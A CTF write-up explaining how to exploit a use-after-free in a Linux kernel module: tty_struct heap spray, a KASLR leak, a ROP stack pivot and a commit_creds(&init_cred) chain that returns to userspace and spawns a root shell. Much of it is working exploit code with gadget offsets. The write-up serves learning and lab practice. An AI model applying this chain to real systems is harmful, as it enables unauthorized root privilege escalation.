Over the last few months I've been deeply studying Linux kernel security and vulnerability exploitation. Today I'd like to present my research on kernel exploitation techniques. In this writeup I'll break down how to exploit a use-after-free vulnerability, what heap spray is, and how to use the tty_struct structure to bypass various kernel protections and spawn a root shell.

# init investigation

As usual, kernel-based CTF challenges follow a similar pattern: the player is given a kernel image, a filesystem, and a qemu script to launch the VM. Our case is not an exception:
![Image]({{ '/assets/images/posts/zip_content.png' | absolute_url }})

1. bzImage - compressed, bootable kernel image
2. vmlinux - uncompressed kernel image, used to extract useful gadgets
3. initramfs.cpio.gz - filesystem archive containing (presumably) a vulnerable kernel module
4. run.sh - qemu launch script

The run.sh script reveals a lot:

```
#!/bin/sh

qemu-system-x86_64 \
  -kernel ./bzImage \
  -cpu max \
  -initrd ./initramfs.cpio.gz \
  -nographic \
  -monitor none,server,nowait,nodelay,reconnect=-1 \
  -serial stdio  \
  -display none \
  -m 256M \
  -no-reboot \
  -nographic \
  -append "console=ttyS0 kpti kaslr quiet" \
  -s \
```

```-cpu max``` means SMAP/SMEP are enabled.
```kpti/kaslr``` are also present in the system.

After extracting initramfs.cpio.gz, we see the standard filesystem and the vulnerable module:
![Image]({{ '/assets/images/posts/initramfs.png' | absolute_url }})

Often in CTF tasks we also get the kernel module source code, but not this time. We'll need to reverse-engineer the compiled kernel module to find the vulnerable spot. In the total we have KASLR/KPTI/SMAP/SMEP protections, which will fall at our feet, and we'll get our coveted root shell!!1

# reverse engineering the kernel module

We have a fairly standard setup: a character device is created, and by opening it, we can interact with the module:
![Image]({{ '/assets/images/posts/initmodule_ida.png' | absolute_url }})

We're most interested in the my_ioctl function which handles ioctl calls. This is where the vulnerability lies, but let's go step by step:

![Image]({{ '/assets/images/posts/ida1.png' | absolute_url }})

- <u>If our ioctl command equals 3</u> — i.e. `ioctl(vuln_fd, 3, kbuff)` — we can write our data into the kernel buffer.
   The first `copy_from_user` call gets the chunk size to write into, the second one reads our actual data.
- <u> If our ioctl command equals 1337</u> — we read data from kernel space into userspace. A good opportunity to leak useful data.

![Image]({{ '/assets/images/posts/ida2.png' | absolute_url }})

- <u> If ioctl is called with command 1</u>, we free our chunk (which was allocated on the heap), but we don't NULL the pointer — this is the vulnerability. Even though we freed the pointer, we still have access to it because it wasn't zeroed.
- <u> If the command is less than 1</u> — a chunk is allocated in the kernel heap. Note that the function tracks the number of allocated chunks; more than one allocation is impossible.

Short summary: we have a kernel module with a use-after-free vulnerability we can exploit to bypass standard kernel protections and get root on this system.

# a bit about protections

This challenge has the standard set of kernel protections:

1. **SMEP** (Supervisor Mode Execution Prevention) — a hardware protection that prevents the CPU, while in kernel mode, from executing code located on userspace memory pages. So even if we capture RIP, we can't just jump to shellcode in userspace — the CPU throws a page fault. Controlled by bit 20 of the CR4 register.

2. **SMAP** (Supervisor Mode Access Prevention) — SMEP's cousin: prevents the 
kernel from reading/writing userspace memory pages. The  kernel can temporarily lift this via  STAC/CLAC instructions (the AC flag in RFLAGS) — this is how `copy_from_user`/`copy_to_user` work under the hood. Controlled by bit 21 of the CR4 register.

   Because of SMEP/SMAP we can't place shellcode or a ROP chain in userspace and ask the kernel to execute or even read it. So in this exploit we build a ROP chain directly in the kernel heap (via tty_struct overwrite) and use gadgets found in the kernel's `.text` section.

3. **KASLR** (Kernel Address Space Layout Randomization) — randomizes the kernel's base address on each boot. Important nuance: relative offsets between kernel base address and kernel's functions remain constant from boot to boot. That's why, with one leaked pointer (in our case `tty_operations`), we can compute kbase and the addresses of all needed functions and gadgets:
```c
   kbase = leaked_tty_operations - offset_tty_operations
```

4. **KPTI** (Kernel Page Table Isolation) — a Meltdown mitigation that separates kernel and user **page tables**. With KPTI enabled, when the CPU switches from user mode to kernel mode (during system calls, interrupts, etc.), it switches to a separate set of page tables that only contains kernel memory mappings. This prevents user-space processes from being able to read kernel memory through cache side-channel attacks even if the CPU speculatively executes unauthorized instructions. The gadget `swapgs_restore_regs_and_return_to_usermode` handles this — see details in the ROP section.

# exploitation strategy

With a use-after-free vulnerability in hand, we can take these steps:
1. Allocate a chunk on the heap of the needed size. The chosen chunk size is critical and determines the entire exploitation strategy.
2. Create a use-after-free — free the chunk. Remember: we free the chunk but don't zero the pointer.
3. Our controlled chunk ends up in the free list, and we can reuse it — we use the heap spray technique to spray the needed structure. In this challenge, our chunk lands in kmalloc-1024, so I'll use the popular `tty_struct` structure.
4. Read our buffer via ioctl. Find the sprayed tty_struct there — use it to leak the kernel base address.
5. With kbase known, determine the addresses of needed functions and gadgets.
6. Modify tty_struct so that tty_operations points to a fake function table.
7. Controlling tty_operations, write the address of a ROP function into the ioctl pointer.
8. The ROP chain contains the logic to call `commit_creds(&init_cred)`.
9. Return to userspace and spawn a root shell.

# let's move to the exploit

A few standard things to do at the start of crafting the exploit:
- Save userspace state. Before switching to kernel space, we need to save CS, SS, RFLAGS, and RSP. I use a standard assembly snippet:

```c
   __asm__(
           ".intel_syntax noprefix;"
           "mov u_cs, cs;"
           "mov u_ss, ss;"
           "mov u_rsp, rsp;"
           "pushf;"
           "pop u_rflags;"
           ".att_syntax;"
   );
```


- Open the character device to get a file descriptor:
```c
   if ((fd = open("/dev/slot_machine", O_RDWR)) < 0)
       fatal("open");
```

The next important step is allocating a memory chunk via ioctl. This chunk is our cornerstone — we'll free it and place the needed structures there:
```c
   if (ioctl(fd, CMD_ALLOC, &chunk_size) < 0)
       fatal("ioctl");
```
Important: the chunk we request from the kernel must land in the kmalloc-1024 cache. As I mentioned, we want to use tty_struct, which by definition lands in kmalloc-1024. So it's critical that our memory also ends up in this cache.

Similarly, via ioctl we create the use-after-free condition by freeing the allocated chunk:
```c
   void ioctl_free() {
       if (ioctl(fd, CMD_KFREE) < 0) {
           puts("[-] failed to kfree the chunk!");
       }
       puts("[+] freed the chunk :)");
   }
```
After freeing our memory, the pointer is added to the freelist — so when needed, the kernel will use this memory first for subsequent allocations. But we still have access to this memory (the pointer wasn't zeroed), and we can still read and write to it. This is the core of the use-after-free vulnerability: if we don't zero the pointer on free, the attacker has broad exploitation opportunities.

So now we have a memory chunk in the freelist that we fully control. This is an excellent opportunity to heap spray a specific structure. Heap spray is a technique where we fill a heap memory region with specific bytes (shellcode/structures). In this challenge, we can control a chunk in the kmalloc-1024 cache, so the most convenient structure to spray is **tty_struct**. We can spray it by opening many `/dev/ptmx` instances. How does this work?

# why I used tty_struct?

To understand why we chose to spray `tty_struct`, we need to look under the hood of this structure and `/dev/ptmx`. It's simple: when we open `/dev/ptmx`, the kernel allocates memory and places `tty_struct` in kmalloc-1024:

```c
    tty = alloc_tty_struct(driver, idx);
    if (!tty) {
        retval = -ENOMEM;
        goto err_module_put;
    }
```

The structure itself looks like:

```c
struct tty_struct {
    struct kref kref;
    int index;
    struct device *dev;
    struct tty_driver *driver;
    struct tty_port *port;
    const struct tty_operations *ops;

    struct tty_ldisc *ldisc;
    struct ld_semaphore ldisc_sem;}

    // more code
```

We're most interested in this line:

```c
const struct tty_operations *ops;
```

`ops` is a pointer to `tty_operations` — a table of function pointers:

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    ssize_t (*write)(struct tty_struct *tty, const u8 *buf, size_t count);
    int  (*put_char)(struct tty_struct *tty, u8 ch);
    void (*flush_chars)(struct tty_struct *tty);
    unsigned int (*write_room)(struct tty_struct *tty);
    unsigned int (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, const struct ktermios *old);
    void (*throttle)(struct tty_struct * tty);
    // more pointers

```

The core principle of this attack: we have a pointer to a free memory chunk that we fully control (read/write). When we open many `/dev/ptmx` instances, the kernel spawns `tty_struct` and uses our previously-freed memory. We can overwrite the `tty_operations` pointer to whatever address we want. And when we call one of the `tty_operations` functions, e.g.:
`ioctl(ptmx_fd, 0xdeadbabe, 0xdeadbeefdeadbeef)`
we redirect the program execution flow to our desired code — i.e., we capture RIP.

It's important to understand how `tty_struct` looks after we open many `/dev/ptmx` instances. I always keep a debugger handy and can observe how the program state changes. Checking the memory region (the one we control) after the `/dev/ptmx` spray, we see `tty_struct`:

![Image]({{ '/assets/images/posts/tty_gef.png' | absolute_url }})

Critical point: the first few bytes `0x5401` is the so-called magic number. When we call `ioctl` on `/dev/ptmx`, the kernel first checks this number via `tty_paranoia_check`:
```c
  struct tty_struct *tty = file_tty(file);
  if (tty_paranoia_check(tty, file_inode(file), "tty_ioctl"))
    return -EINVAL;
```
So `tty_struct->magic` must always be `0x5401`. `0xffffffff81c39c60` points to the tty_operations and this pointer we will overwrite.

# how to bypass KASLR

`tty_struct` also lets us bypass KASLR — kernel address randomization. As you recall, `tty_struct` contains the `tty_operations` pointer. Importantly, `tty_operations` is always loaded at a static offset relative to the kernel base address. No matter what the kernel's base address is, `tty_operations` is always at the same static offset. In my case the offset was:
```c
kbase = tty_operations - 0x6242e0;
```

With the kernel base address known, we can compute the addresses of needed functions:
```c
    kbase = kbuff[4] - 0x6242e0;
    commit_creds = kbase + 0x27c9d0;
    pop_rdi = kbase + 0x507fed;
    push_rdx = kbase + 0x25a04a;
    init_cred = kbase + 0x838f40;
    swapgs = kbase + 0x153b;
```

# crafting the ROP

Because SMEP is enabled, we can't execute shellcode in userspace: even if we capture RIP, jumping to a user page from kernel mode causes a page fault. And because of SMAP, we can't even read those pages from the kernel. The solution is to build a ROP chain (return-oriented programming). This is a chain of short assembly instruction sequences like:

```c
    push rdx; pop rsp; ret;
```

Each sequence performs specific registers manipulations and ends with a `ret` instruction. These assembly snippets are called gadgets and are part of the kernel's own functions (they live in the `.text` section), so SMEP/SMAP don't apply to them — for the CPU, this is legitimate kernel code. ROP chains are notable because by controlling the registers and having a `ret` at the end, we control the program flow: we load the needed parameters into registers and the `ret` instruction pops the next return address off the stack. So if we want to call `dumb_shit(NULL)`, we'd craft this chain:

```c
    ROP = pop_rdi;
    ROP += 0;
    ROP += dumb_shit;
```

We control RIP (execution flow), but we still don't control RSP (the stack) and we want to place all our ROP addresses on the stack. But remember: we overwrote `tty_operations`, which stores pointers to various functions for `/dev/ptmx`. That's why we overwrite the `ioctl` pointer:

```c
int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
```
with an address in memory containing the gadget:

```c
    push rdx; pop rsp; pop rbp; ret;
```

Then, calling ioctl on `/dev/ptmx`:
```c
    for (int i = 0; i < 10; i++) {
        printf("[~] ioctl ptmx %d\n...", i);
        ioctl(ptmx_fds[i], 0xdeadbabe, rop_addr);
    }
```

We jump to the address where the `push rdx` gadget lives, push `rop_addr` (rdx is the third argument), and immediately pop it into RSP, where our entire ROP chain is already laid out. Now we control the stack too!

Here's our ROP chain:
```c
    *ROP++ = pop_rdi;
    *ROP++ = init_cred;
    *ROP++ = commit_creds;
    *ROP++ = swapgs;
    *ROP++ = (uint64_t) got_root;
    *ROP++ = u_cs;
    *ROP++ = u_rflags;
    *ROP++ = u_rsp;
    *ROP++ = u_ss;
```

So how it works:
- `pop_rdi` — gadget `pop rdi; ret`. Pops the next value into RDI (first function argument).
- `init_cred` — address of the cred structure with root fields:
```c
   	.gid			= GLOBAL_ROOT_GID,
   	.suid			= GLOBAL_ROOT_UID,
   	.sgid			= GLOBAL_ROOT_GID,
   	.euid			= GLOBAL_ROOT_UID,
   	.egid			= GLOBAL_ROOT_GID,
```
- `commit_creds` — function that updates real_cred/cred in the task struct. If we redirect execution to `commit_creds(&init_cred)`, we overwrite our exploit's cred fields with root values.
- `swapgs` — address of `swapgs_restore_regs_and_return_to_usermode`. As the name says, it carefully executes the full userspace return sequence: switches CR3 to the user page table (needed because of KPTI), executes SWAPGS to restore the userspace GS base, restores registers (CS, SS, RFLAGS, RSP — saved in the preparation phase), and transfers control back to userspace via IRETQ. We must jump not to the very beginning but to the right offset (after the prologue) to hit the restore logic directly.

The line

```c
    *ROP++ = (uint64_t) got_root;
```
sets RIP to our function that spawns a shell:
```c
  int got_root() {
      char *args[] = {"/bin/sh", "-i", NULL};
      execve("/bin/sh", args, NULL);
  }
```
